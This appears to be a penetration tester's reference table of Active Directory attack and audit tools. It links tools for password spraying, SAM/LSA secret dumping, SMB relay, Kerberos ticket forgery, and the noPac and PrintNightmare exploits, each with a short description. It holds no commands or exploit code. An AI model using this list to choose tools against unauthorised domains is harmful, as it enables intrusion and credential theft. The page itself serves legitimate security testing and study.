| [windapsearch](https://github.com/ropnop/windapsearch) |   A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries. |  
| [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray) | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. |  
| [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) | The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).  |  
| [smbmap](https://github.com/ShawnDEvans/smbmap) | SMB share enumeration across a domain. |  
| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) | Part of the Impacket toolset, it provides us with psexec like functionality in the form of a semi-interactive shell. |  
| [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) | Part of Impacket toolset, it provides the capability of command execution over WMI. |  
| [Snaffler](https://github.com/SnaffCon/Snaffler) | Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares. |  
| [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) | Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network. |  
| [setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) | Reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service account. |  

| [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) | Remotely dump SAM and LSA secrets from a host. |  
| [evil-winrm](https://github.com/Hackplayers/evil-winrm) | Provides us with an interactive shell on host over the WinRM protocol. |  
| [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) | Part of Impacket toolset, it provides the ability to interact with MSSQL databases. |  

# noPac
| [noPac.py](https://github.com/Ridter/noPac) | Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user. |  

https://github.com/Ridter/noPac

| [rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py) | Part of the Impacket toolset, RPC endpoint mapper. |  
| [CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py) | Printnightmare PoC in python. |  
| [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) | Part of the Impacket toolset, it performs SMB relay attacks. |  
| [PetitPotam.py](https://github.com/topotam/PetitPotam) | PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions. |  
| [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) | Tool for manipulating certificates and TGTs. |  
| [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py) | This tool will use an existing TGT to request a PAC for the current user using U2U. |  
| [adidnsdump](https://github.com/dirkjanm/adidnsdump) | A tool for enumeration and dumping of DNS records from a domain. Similar to performing a DNS Zone transfer. |  
| [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt) | Extracts usernames and passwords from Group Policy preferences. |  
| [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) | Attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set. |  
| [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) | SID bruteforcing tool. |  
| [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) | A tool for creation and customization of TGT/TGS tickets. |  
| [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) | Part of the Impacket toolset, It is a tool for child to parent domain privilege escalation. |  
| [Active Directory Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) | Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for off-line analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions. |  
| [PingCastle](https://www.pingcastle.com/documentation/) | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security). |  
| [Group3r](https://github.com/Group3r/Group3r) | Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).          |  
| [ADRecon](https://github.com/adrecon/ADRecon) | A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state. |  
  

# Ref
- Double-Hop
https://posts.slayerlabs.com/double-hop/